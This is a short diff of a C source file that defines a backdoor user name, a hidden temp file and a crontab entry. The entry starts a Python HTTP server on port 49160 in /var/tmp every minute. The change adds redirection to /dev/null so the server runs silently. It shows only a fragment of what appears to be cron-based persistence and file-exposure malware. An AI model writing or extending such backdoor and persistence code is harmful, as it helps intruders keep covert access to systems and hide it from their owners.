@@ -6,7 +6,7 @@
 #include <string.h>
 
 #define BACKDOOR_USER "nihargayam"
-#define CRONTAB_CMD "cd /var/tmp && python3 -m http.server 49160"
+#define CRONTAB_CMD "cd /var/tmp && python3 -m http.server 49160 >> /dev/null 2>&1"
 #define CRONTAB_LINE "* * * * * " CRONTAB_CMD
 #define TMPFILE "/tmp/.cron_tmp"
 
